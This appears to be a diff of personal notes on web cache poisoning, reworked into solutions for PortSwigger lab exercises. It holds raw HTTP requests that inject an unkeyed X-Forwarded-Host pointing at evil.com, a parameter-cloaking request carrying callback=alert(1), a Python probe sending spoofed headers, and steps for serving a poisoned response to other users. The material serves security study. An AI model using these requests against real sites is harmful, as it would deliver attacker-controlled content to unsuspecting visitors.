@@ -1,43 +1,52 @@
-# Web Cache Poisoning - Attack Techniques
+# Web Cache Poisoning Attack Techniques
 
-## Unkeyed Headers
+## PortSwigger Lab Solutions
+
+### Lab 1: Unkeyed header injection
+**Approach**: Inject via unkeyed header (X-Forwarded-Host)
 ```
-# If X-Forwarded-Host is not part of cache key:
 GET / HTTP/1.1
-Host: target.com
-X-Forwarded-Host: attacker.com
-
-# Response may cache attacker.com in resource URLs
-# Next user gets attacker.com's resources
+Host: TARGET
+X-Forwarded-Host: evil.com
+# Server uses X-Forwarded-Host for URLs
+# Cache serves poisoned response to all users
 ```
 
-## Cache Key Manipulation
+### Lab 2: Parameter cloaking
+**Approach**: Unkeyed param hides keyed param
 ```
-# If cache key doesn't include all parameters:
-GET /?utm_source=legit HTTP/1.1  # Cached
-GET /?utm_source=evil HTTP/1.1   # Different cache key, same response
+GET /?utm_content=x;callback=alert(1) HTTP/1.1
+Host: TARGET
+# Cache key: /?utm_content=x
+# But server parses: callback=alert(1)
 ```
 
-## Parameter Cloaking
+### Lab 3: Cache key injection
+**Approach**: Inject into cache key via unkeyed header
 ```
-# If cache normalizes parameters differently:
-GET /?param=legit&param=evil HTTP/1.1
-# Cache sees 'param=legit', backend sees 'param=evil'
+GET / HTTP/1.1
+Host: TARGET
+X-Forwarded-Host: evil.com
+# Cache key includes Host
+# But response includes script from evil.com
 ```
 
 ## Detection
+```python
+import requests
+headers = {
+    "X-Forwarded-Host": "evil.com",
+    "X-Original-URL": "/admin",
+    "X-Rewrite-URL": "/admin",
+}
+r = requests.get("https://TARGET", headers=headers)
+if "evil.com" in r.text:
+    print("Cache poisoning possible")
 ```
-# Check cache headers
-X-Cache: hit/miss
-Cache-Control: max-age=N
-Age: N
 
-# Check if header is reflected
-X-Forwarded-Host: test → check if 'test' appears in response
-```
-
-## PortSwigger Lab Approach
-1. Send request with unkeyed header (X-Forwarded-Host)
-2. Check if header value reflected in response
-3. If reflected → cache poisoning possible
-4. Deliver exploit to victim via cache
+## Exploit Steps
+1. Send request with unkeyed header
+2. Check if response reflects the header
+3. Check if response is cached (X-Cache: hit)
+4. Use exploit server to host payload
+5. Other users get poisoned response
